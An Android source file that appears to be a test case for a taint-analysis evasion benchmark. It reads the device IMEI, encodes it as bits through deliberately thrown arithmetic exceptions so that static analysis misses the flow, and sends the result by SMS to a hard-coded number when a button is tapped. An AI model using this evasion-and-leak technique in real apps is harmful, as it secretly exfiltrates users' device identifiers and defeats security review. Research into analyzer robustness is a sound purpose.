package com.examples.evasion.bvb.ereinfovasion;

        import android.app.PendingIntent;
        import android.content.Context;
        import android.content.Intent;
        import android.support.v7.app.AppCompatActivity;
        import android.os.Bundle;
        import android.telephony.SmsManager;
        import android.telephony.TelephonyManager;
        import android.view.View;
        import android.widget.Button;

/**
 * @testcase_name ere
 * @version 0.1
 * @author Malaviya National Institute Of Technology, A Ph.D Scholar Student in C.S.E.Department, Ph.D in Evasion Techniques(InfoVasion) 
 * @author_mail 2013rcp9575@mnit.ac.in,bvbld@yahoo.com
 * 
 * @description A Evasion algorithm implemented using Explicitly adding run-time exceptions. Sensitive data is stored
 * 	in a field of this class and converted into binary bitstream leaked via implicit control.
 * @dataflow onCreate: source -> bc.imei -> Binary Stream -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle explicit run-time exceptions and intermediate binary stream interuptions.
 */

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    public String mobileNo = "+919825046179", results = "";
    protected int X[];

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        int p = 1;
        Button button = (Button) findViewById(R.id.sendMsg);
        button.setOnClickListener(this);

        char[] list = stringToBinary(getIMEI(this)).toCharArray();
        X = new int[list.length];

        for (int i = 0; i < list.length; i++) {
            X[i] = Character.digit(list[i], 10);
        }

        for (int i = 0; i < X.length; i++) {
            try {
                p = p / X[i];
                results = results + "1";
            } catch (ArithmeticException e) {
                results = results + "0";
                p = 1;
            }
        }

    }

    public String getIMEI(Context context) {
        TelephonyManager mngr = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        String imei = mngr.getDeviceId();
        return imei;
    }

    public static String stringToBinary(String str) {

        String result = "";
        char[] messChar = str.toCharArray();

        for (int i = 0; i < messChar.length; i++) {
            result += Integer.toBinaryString(messChar[i]);
        }
        return result;
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.sendMsg:
                //sendMsg();
                //Getting intent and PendingIntent instance
                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                PendingIntent pi = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);
                //Get the SmsManager instance and call the sendTextMessage method to send message
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(mobileNo, null, results, pi, null);
                break;
        }
    }
}
